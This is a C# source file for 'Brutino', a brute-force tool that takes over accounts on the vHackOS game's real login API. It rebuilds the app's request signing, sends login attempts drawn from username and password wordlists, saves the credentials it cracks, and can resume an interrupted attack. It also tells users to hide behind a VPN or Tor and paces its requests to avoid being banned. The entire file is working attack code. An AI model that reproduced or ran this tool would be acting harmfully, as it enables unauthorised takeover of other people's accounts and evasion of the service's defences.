using System;
using System.Net;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Web;
using System.Threading;
using System.Text;
using System.Collections.Generic;

namespace Brutino
{
    class MainClass
    {
        public static int temp = 0;
        public static int temp_2 = 0;
        public static string wordlist;
        public static string username;
        public static int found = 0;
        public static string[] result = new string[1000];
        public static DateTime today = DateTime.Now;
        public static string file = ($@".\brutino_logs\resume{today:dd-MM-yy}at{today:HH_mm_ss_mstt}.log");
        public static string output = ($@".\results\Results of {today:dd-MM-yy}at{today:HH_mm_ss_mstt}.txt");

        public static string CalculateMD5Hash(string input)
        {
            //Prepare md5 for get parameter pass formatting password itself with base64 jason string parameter: get user request

            MD5 md5 = System.Security.Cryptography.MD5.Create();

            byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(input);

            byte[] hash = md5.ComputeHash(inputBytes);

            // step 2, convert byte array to hex string

            StringBuilder sb = new StringBuilder();

            for (int i = 0; i < hash.Length; i++)

            {

                sb.Append(hash[i].ToString("x2"));

            }

            return sb.ToString();

        }

        public static string Base64Encode(string plainText)
        {
            //Create Base64encode in order to format user get parameter for http request
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }

        public static void initial()
        {
            //Welcome dear user! Banner graphic
            Console.Title = "Brutino Vhackos bruteforcer";
            Console.BackgroundColor = ConsoleColor.Black;
            Console.Clear();

            if (!Directory.Exists("brutino_logs"))
            {
                Directory.CreateDirectory("brutino_logs");
            }

            if (!Directory.Exists("results"))
            {
                Directory.CreateDirectory("results");
            }

            Console.ForegroundColor = ConsoleColor.DarkGreen;
            string gg = "" +
                "+-----------------------------------------------------------------------------+\n" +
                "| _    ____               __                 ____             __              |\n" +
                "|| |  / / /_  ____ ______/ /______  _____   / __ )_______  __/ /____  _____   |\n" +
                "|| | / / __ \\/ __ `/ ___/ //_/ __ \\/ ___/  / __  / ___/ / / / __/ _ \\/ ___/   |\n" +
                "|| |/ / / / / /_/ / /__/ ,< / /_/ (__  )  / /_/ / /  / /_/ / /_/  __/ /       |\n" +
                "||___/_/ /_/\\__,_/\\___/_/|_|\\____/____/  /_____/_/   \\__,_/\\__/\\___/_/        |\n" +
                "|                                                                             |\n" +
                "| Simple bruteforcer for vhackos accounts                                     |\n" +
                "| Coded By Angelo Rosa 2018                                                   |\n" +
                "| Use a Vpn or Proxy or Tor before to start the script                        |\n" +
                "+-----------------------------------------------------------------------------+\n";

            Console.Write(gg);
            Console.ForegroundColor = ConsoleColor.White;
        }

        public static void table_trying(string ip, string testing_user, string line, int count, int tried, double tProgress, int found, int u, int j, string[] rs, string tim)
        {
            //Write infos while bruteforcing
            Console.Clear();
            initial();
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\n\t Your Ip\t");
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine(ip);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Account\t");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("{0}", testing_user);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Trying\t        ");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine(line);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Total Credentials ");
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine(count);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Attempts\t");
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            Console.WriteLine(tried);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Found\t\t");
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.WriteLine(found);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Time elapsed\t");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine((int)tProgress + " " + tim);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Progress\t");
            Console.ForegroundColor = ConsoleColor.Blue;
            double dProgress = ((double)tried / (double)count) * 100.0;
            Console.WriteLine((int)dProgress + "%");

            //Save results every 50 attempts
            if (tried == (temp + 50))
            {
                saveProgress(j, u);
                temp = tried;
            }

            //If Found a result update output file with all infos about cracked account
            if (found == (temp_2 + 1))
            {
                save_found(rs);
                temp_2 = found;
            }
        }

        public static void save_found(string[] rs)
        {
            if (!File.Exists(output))
            {
                File.Create(output).Close();
            }

            File.WriteAllLines(output, rs);
        }

        public static void saveProgress(int count, int u)
        {
            //Save Progress of attack
            string save = "position=" + count + "\nfile=" + wordlist + "\nfile_usernames=" + username + "\nusername=" + u;
            File.WriteAllText(file, save);
        }

        public static void table_found(string[] rs, double elapsed, int found , string tim)
        {
            //Well Done! Password found write results
            Console.Clear();
            initial();
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Status ");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("Found!");
            Console.ForegroundColor = ConsoleColor.Green;
            for (int i = 1; i <= found; i++)
            {
                Console.WriteLine(rs[i]);
            }
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Elapsed time\t");
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine((int)elapsed + " " + tim);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Saved to ");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine(output);
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("\n\n Type a key to exit");
            Console.ReadLine();
            System.Environment.Exit(1);
        }

        public static void table_not_found(double elapsed , string tim)
        {
            //Ops, attack failed no results found
            Console.Clear();
            initial();
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Status \t");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("No Accounts Cracked :(!");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Elapsed time\t");
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine((int)elapsed + tim);
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("\n\n Type a key to exit");
            Console.ReadLine();
            System.Environment.Exit(1);

        }

        public static void generate_combo(string username)
        {
            var time = System.Diagnostics.Stopwatch.StartNew();
            Console.WriteLine("Starting formatting... please wait");
            string[] lines = File.ReadAllLines(username);
            int size = File.ReadAllLines(username).Length, count = 0;
            string[] line = new string[size];
            string directory = Directory.GetCurrentDirectory();
            string usr = Path.GetFileNameWithoutExtension(username);
            string save = directory + $@"\{usr}" + "_formatted" + ".txt";

            for (int i = 0; i < size; i++)
            {
                line[i] = lines[i] + "\n" + lines[i].ToLower() + "\n" + lines[i].ToUpper() + "\n" + lines[i].ToUpper().ElementAt(0);
                count++;
            }

            try
            {
                File.WriteAllLines(save, line);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error while saving file: {0}", ex);
            }


            var elapsed = time.Elapsed.Minutes;
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine(" Wordlist succesfully formatted in {0:N3} minutes \n Saved in {1}", elapsed, save);
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine(" Total formatted {0} users", count);
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("\nType a key to return back...");
            Console.ReadLine();
            Main(null);
            System.Environment.Exit(1);

        }

        public static int u, j;

        public static void Main(string[] args = null)
        {
            initial();
            int count = 0, tried = 0, count_users = 0;
            string respond, ip, choose, resume, combo;
            string[] check_row;
            int position = 1, Progress_User = 1;

            //Api VhackOs Url
            string api = "https://api.vhack.cc/mobile/15/login.php";

            //Api to get your ip address
            string api_ip = "https://ident.me";


            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("Generate a combolist?(Y/N)");
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            combo = Console.ReadLine();

            do
            {

                if (combo.ToLower() == "n")
                {
                    do
                    {
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.Write("Start new Attack(1) or resume(2)? ");
                        Console.ForegroundColor = ConsoleColor.DarkYellow;
                        choose = Console.ReadLine();

                        if (choose == "2")
                        {
                            Console.ForegroundColor = ConsoleColor.White;
                            Console.Write("Insert resuming file=> ");
                            Console.ForegroundColor = ConsoleColor.DarkYellow;
                            resume = Console.ReadLine();

                            if (!File.Exists(resume))
                            {
                                Console.ForegroundColor = ConsoleColor.Red;
                                Console.WriteLine("File not found! Quitting...");
                                System.Environment.Exit(4);
                            }
                            else
                            {
                                if (new FileInfo(resume).Length == 0)
                                {
                                    Console.ForegroundColor = ConsoleColor.Red;
                                    Console.WriteLine("This file is empty! Quitting...");
                                    System.Environment.Exit(4);
                                }
                                else
                                {
                                    check_row = File.ReadAllLines(resume);
                                    if (check_row[0].Contains("position=") && check_row[1].Contains("file=") && check_row[2].Contains("file_usernames=") && check_row[3].Contains("username="))
                                    {
                                        position = Int32.Parse(check_row[0].Replace("position=", ""));
                                        wordlist = check_row[1].Replace("file=", "");
                                        username = check_row[2].Replace("file_usernames=", "");
                                        Progress_User = Int32.Parse(check_row[3].Replace("username=", ""));
                                    }
                                    else
                                    {
                                        Console.ForegroundColor = ConsoleColor.Red;
                                        Console.WriteLine("File is bad formatted! Quitting...");
                                        System.Environment.Exit(4);
                                    }
                                }
                            }
                        }

                        if (choose == "1")
                        {
                            do
                            {
                                do
                                {
                                    Console.ForegroundColor = ConsoleColor.White;
                                    Console.Write("Username List=> ");
                                    Console.ForegroundColor = ConsoleColor.DarkYellow;
                                    username = Console.ReadLine();

                                    if (!File.Exists(username))
                                    {
                                        Console.ForegroundColor = ConsoleColor.Red;
                                        Console.WriteLine("User list not found, try again");
                                        Console.ForegroundColor = ConsoleColor.White;
                                    }
                                } while (!File.Exists(username));

                                Console.ForegroundColor = ConsoleColor.White;
                                Console.Write("Wordlist patch=> ");
                                Console.ForegroundColor = ConsoleColor.DarkYellow;
                                wordlist = Console.ReadLine();

                                if (!File.Exists(wordlist))
                                {
                                    Console.ForegroundColor = ConsoleColor.Red;
                                    Console.WriteLine("Wordlist not found, try again");
                                    Console.ForegroundColor = ConsoleColor.White;
                                }

                            } while ((!File.Exists(wordlist)));
                        }
                    } while ((choose != "1" && choose != "2"));
                }
                else if (combo.ToLower() == "y")
                {
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.Write("Username List=> ");
                    Console.ForegroundColor = ConsoleColor.DarkYellow;
                    username = Console.ReadLine();

                    if (!File.Exists(username))
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("User list not found, try again");
                        Console.ForegroundColor = ConsoleColor.White;
                    }
                }
            } while ((combo.ToLower() != "y") && (combo.ToLower() != "n") || !File.Exists(username));

            if (combo.ToLower() == "y")
                generate_combo(username);

            Console.WriteLine("\nProcess starting please wait....");

            //Getting your ip address
            HttpWebRequest rew = (HttpWebRequest)WebRequest.Create(api_ip);
            rew.AutomaticDecompression = DecompressionMethods.GZip;

            using (HttpWebResponse res = (HttpWebResponse)rew.GetResponse())
            using (Stream str = res.GetResponseStream())
            using (StreamReader read = new StreamReader(str))
            {
                respond = read.ReadToEnd();
            }

            ip = respond;

            //Start the watch time to calculate time elapsed at the end
            var watch_for_this = System.Diagnostics.Stopwatch.StartNew();
            var progress = System.Diagnostics.Stopwatch.StartNew();


            string hash, jasonString, jasonBased, md5_jason_1, password, req, url;

            //The string of resquest in Jason Format
            string String = ("{\"username\":\"#replace#\", \"password\":\"#replace2#\",\"lastread\":\"0\",\"lang\":\"it\",\"verify\":\"False\"}");

            try
            {
                //Counting how many passwords and users in files
                count_users = File.ReadAllLines(username).Length;
                count = File.ReadAllLines(wordlist).Length;


                int total = count_users * count;

                for (u = Progress_User - 1; u < count_users; u++)
                {
                    for (j = position - 1; j < count; j++)
                    {
                        //Initializing strings of requests for every attempt
                        hash = string.Empty;
                        jasonString = string.Empty;
                        jasonBased = string.Empty;
                        md5_jason_1 = string.Empty;
                        password = string.Empty;
                        req = string.Empty;
                        tried++;

                        var line = File.ReadAllLines(wordlist);
                        var usr = File.ReadAllLines(username);

                        var time = progress.Elapsed.TotalMinutes;
                        var tim =  "minutes";

                        if (time > 60)
                        {
                            time = progress.Elapsed.TotalHours;
                            tim = " hours";
                        }

                        table_trying(ip, usr[u], line[j], total, tried, time, found, u, j, result , tim);

                        //Calculate MD5 hash of password
                        hash = CalculateMD5Hash(line[j]);
                        //Replacing signalers with username plaintext and password already md5 hashed
                        jasonString = String.Replace("#replace#", usr[u]).Replace("#replace2#", hash);

                        jasonBased = Base64Encode(jasonString);

                        //Calculating MD5 of the entire Jason string with username and passowrd replaced 
                        md5_jason_1 = CalculateMD5Hash(jasonString);

                        //Calculating the pass get parameter with the Jason string normal * 3 but the least must be the jason string in md5 calculated version
                        password = CalculateMD5Hash(jasonString + jasonString + md5_jason_1);

                        string html = string.Empty;
                        //Let's replace signalers with jason request base64encode and the calculated password as pass
                        req = "?user=#replace3#&pass=#replace4#";

                        url = api + req.Replace("#replace3#", jasonBased).Replace("#replace4#", password);

                        //Avoid banning by the server with this delay
                        Thread.Sleep(200);

                        try
                        {
                            //Start the request
                            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                            request.AutomaticDecompression = DecompressionMethods.GZip;

                            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                            using (Stream stream = response.GetResponseStream())
                            using (StreamReader reader_2 = new StreamReader(stream))
                            {
                                //Saving the html (That's it's a jason response by the page) to a string
                                html = reader_2.ReadToEnd();
                            }
                        }
                        catch (Exception)
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("Unable to send requests anymore stopping.....\n");
                            Console.ReadLine();
                            System.Environment.Exit(3);
                        }

                        //Checking if jason response contains the accesstoken and uid, if yes you are logged in and you're password is correct
                        if (html.Contains("accesstoken") && html.Contains("uid"))
                        {
                            found++;
                            result[found] = "\t Username " + usr[u] + " Password: " + line[j];
                        }
                        position = 1;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Exception Occurred... Stopping. Wordlist format not accepted, or path file changed\n{0}", ex);
                Console.ReadLine();
                System.Environment.Exit(0);
            }

            if (found == 0)
            {
                watch_for_this.Stop();
                var elapsed = watch_for_this.Elapsed.TotalMinutes;
                var tim = "minutes";

                if (elapsed > 60)
                {
                    elapsed = watch_for_this.Elapsed.TotalHours;
                    tim = "hours";
                }

                table_not_found(elapsed , tim);
            }

            if (u == count_users && found > 0)
            {

                watch_for_this.Stop();
                var ela = watch_for_this.Elapsed.TotalMinutes;
                var tim = " minutes";

                if (ela > 60)
                {
                    ela = watch_for_this.Elapsed.TotalHours;
                    tim = " hours";
                }

                table_found(result, ela, found , tim);
            }
        }
    }
}
